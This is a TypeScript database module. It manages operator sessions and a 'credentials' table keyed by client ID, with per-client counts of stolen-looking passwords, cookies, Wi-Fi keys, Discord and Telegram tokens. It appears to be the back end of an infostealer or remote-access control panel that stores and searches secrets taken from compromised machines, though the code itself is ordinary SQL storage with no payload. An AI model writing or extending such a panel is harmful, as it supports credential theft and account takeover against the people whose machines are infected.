import { getDatabase } from './db'
import { v4 as uuidv4 } from 'uuid'

export interface Session {
  id: string
  username: string
  login_time: string
  last_activity: string
  ip_address?: string
  user_agent?: string
  is_active: boolean
}

export interface Credential {
  id: string
  client_id: string
  credential_type: string
  username?: string
  password?: string
  domain?: string
  application?: string
  found_at?: string
  created_at: string
}

export function createSession(username: string, ipAddress?: string, userAgent?: string): Session {
  const db = getDatabase()
  const id = uuidv4()
  const now = new Date().toISOString()

  const stmt = db.prepare(`
    INSERT INTO sessions (id, username, login_time, last_activity, ip_address, user_agent, is_active)
    VALUES (?, ?, ?, ?, ?, ?, 1)
  `)

  stmt.run(id, username, now, now, ipAddress || null, userAgent || null)

  return getSession(id)!
}

export function getSession(id: string): Session | null {
  const db = getDatabase()
  const stmt = db.prepare('SELECT * FROM sessions WHERE id = ?')
  const row = stmt.get(id) as any
  
  if (!row) return null
  
  return formatSession(row)
}

export function getActiveSessions(): Session[] {
  const db = getDatabase()
  const stmt = db.prepare("SELECT * FROM sessions WHERE is_active = 1 ORDER BY last_activity DESC")
  const rows = stmt.all() as any[]
  
  return rows.map(formatSession)
}

export function updateSessionActivity(id: string): void {
  const db = getDatabase()
  const now = new Date().toISOString()
  
  const stmt = db.prepare('UPDATE sessions SET last_activity = ? WHERE id = ?')
  stmt.run(now, id)
}

export function endSession(id: string): boolean {
  const db = getDatabase()
  const stmt = db.prepare('UPDATE sessions SET is_active = 0 WHERE id = ?')
  const result = stmt.run(id)
  
  return (result.changes ?? 0) > 0
}

export function endAllSessions(): number {
  const db = getDatabase()
  const stmt = db.prepare('UPDATE sessions SET is_active = 0 WHERE is_active = 1')
  const result = stmt.run()
  
  return result.changes ?? 0
}

export function getSessionStats(): {
  active: number
  total: number
} {
  const db = getDatabase()
  
  const active = (db.prepare("SELECT COUNT(*) as count FROM sessions WHERE is_active = 1").get() as any).count
  const total = (db.prepare("SELECT COUNT(*) as count FROM sessions").get() as any).count
  
  return { active, total }
}

// Credentials functions

export function recordCredential(input: {
  client_id: string
  credential_type: string
  username?: string
  password?: string
  domain?: string
  application?: string
  found_at?: string
}): Credential {
  const db = getDatabase()
  const id = uuidv4()
  const now = new Date().toISOString()

  const stmt = db.prepare(`
    INSERT INTO credentials 
    (id, client_id, credential_type, username, password, domain, application, found_at, created_at)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
  `)

  stmt.run(
    id,
    input.client_id,
    input.credential_type,
    input.username || null,
    input.password || null,
    input.domain || null,
    input.application || null,
    input.found_at || null,
    now
  )

  return getCredential(id)!
}

export function getCredential(id: string): Credential | null {
  const db = getDatabase()
  const stmt = db.prepare('SELECT * FROM credentials WHERE id = ?')
  const row = stmt.get(id) as any
  
  if (!row) return null
  
  return formatCredential(row)
}

export function getClientCredentials(clientId: string, limit = 100): Credential[] {
  const db = getDatabase()
  const stmt = db.prepare(`
    SELECT * FROM credentials 
    WHERE client_id = ? 
    ORDER BY created_at DESC 
    LIMIT ?
  `)
  
  const rows = stmt.all(clientId, limit) as any[]
  return rows.map(formatCredential)
}

export function getCredentialsByType(clientId: string, type: string): Credential[] {
  const db = getDatabase()
  const stmt = db.prepare(`
    SELECT * FROM credentials 
    WHERE client_id = ? AND credential_type = ?
    ORDER BY created_at DESC
  `)
  
  const rows = stmt.all(clientId, type) as any[]
  return rows.map(formatCredential)
}

export function searchCredentials(clientId: string, query: string, limit = 50): Credential[] {
  const db = getDatabase()
  const searchTerm = `%${query}%`
  
  const stmt = db.prepare(`
    SELECT * FROM credentials 
    WHERE client_id = ? AND (
      username LIKE ? 
      OR domain LIKE ? 
      OR application LIKE ?
    )
    ORDER BY created_at DESC 
    LIMIT ?
  `)
  
  const rows = stmt.all(clientId, searchTerm, searchTerm, searchTerm, limit) as any[]
  return rows.map(formatCredential)
}

export function deleteCredential(id: string): boolean {
  const db = getDatabase()
  const stmt = db.prepare('DELETE FROM credentials WHERE id = ?')
  const result = stmt.run(id)
  
  return (result.changes ?? 0) > 0
}

export function getCredentialStats(clientId: string): {
  total: number
  passwords: number
  cookies: number
  wifi: number
  discord: number
  telegram: number
} {
  const db = getDatabase()
  
  const total = (db.prepare("SELECT COUNT(*) as count FROM credentials WHERE client_id = ?").get(clientId) as any).count
  const passwords = (db.prepare("SELECT COUNT(*) as count FROM credentials WHERE client_id = ? AND credential_type = 'passwords'").get(clientId) as any).count
  const cookies = (db.prepare("SELECT COUNT(*) as count FROM credentials WHERE client_id = ? AND credential_type = 'cookies'").get(clientId) as any).count
  const wifi = (db.prepare("SELECT COUNT(*) as count FROM credentials WHERE client_id = ? AND credential_type = 'wifi'").get(clientId) as any).count
  const discord = (db.prepare("SELECT COUNT(*) as count FROM credentials WHERE client_id = ? AND credential_type = 'discord'").get(clientId) as any).count
  const telegram = (db.prepare("SELECT COUNT(*) as count FROM credentials WHERE client_id = ? AND credential_type = 'telegram'").get(clientId) as any).count
  
  return { total, passwords, cookies, wifi, discord, telegram }
}

export function deleteOldCredentials(daysOld = 90): number {
  const db = getDatabase()
  const stmt = db.prepare(`
    DELETE FROM credentials 
    WHERE created_at < datetime('now', '-' || ? || ' days')
  `)
  
  const result = stmt.run(daysOld)
  return result.changes ?? 0
}

function formatSession(row: any): Session {
  return {
    id: row.id,
    username: row.username,
    login_time: row.login_time,
    last_activity: row.last_activity,
    ip_address: row.ip_address,
    user_agent: row.user_agent,
    is_active: Boolean(row.is_active),
  }
}

function formatCredential(row: any): Credential {
  return {
    id: row.id,
    client_id: row.client_id,
    credential_type: row.credential_type,
    username: row.username,
    password: row.password,
    domain: row.domain,
    application: row.application,
    found_at: row.found_at,
    created_at: row.created_at,
  }
}
